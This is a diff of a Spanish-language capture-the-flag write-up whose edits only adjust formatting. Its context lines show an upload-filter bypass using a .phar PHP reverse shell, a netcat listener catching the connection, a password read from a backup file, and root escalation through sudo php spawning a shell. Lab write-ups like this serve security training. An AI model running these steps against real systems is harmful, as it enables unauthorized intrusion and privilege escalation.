@@ -141,7 +141,9 @@ Vamos a intentar subir una `reverse shell` en `PHP` de `Pentestmonkey`.
 
 Para evitar posibles restricciones sobre la extensión `.php`, renombramos el archivo con la extensión `.phar`.
 
-Lo subimos y no parece dar ningún error. Navegamos al directorio `/uploads` y confirmamos que nuestra `revshell` está subida.
+Lo subimos y no parece dar ningún error. 
+
+Navegamos al directorio `/uploads` y confirmamos que nuestra `revshell` está subida.
 
 ![](../../images/pharrrr.png)
 
@@ -153,7 +155,6 @@ sudo nc -nlvp 4444
 
 Ejecutamos el archivo desde el navegador y recibimos la conexión.
 
-Info:
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 44330
@@ -201,7 +202,6 @@ Enumerando el sistema, en la ruta `/var/www/picadilly/` encontramos un archivo l
 cat backup.txt
 ```
 
-Info:
 ```
 /// The users mateo password is ////
 
@@ -263,7 +263,6 @@ Observamos que podemos ejecutar el binario `php` con privilegios de `root` sin n
 sudo /usr/bin/php -r 'system("/bin/sh -i");'
 ```
 
-Info:
 ```
 # whoami
 root
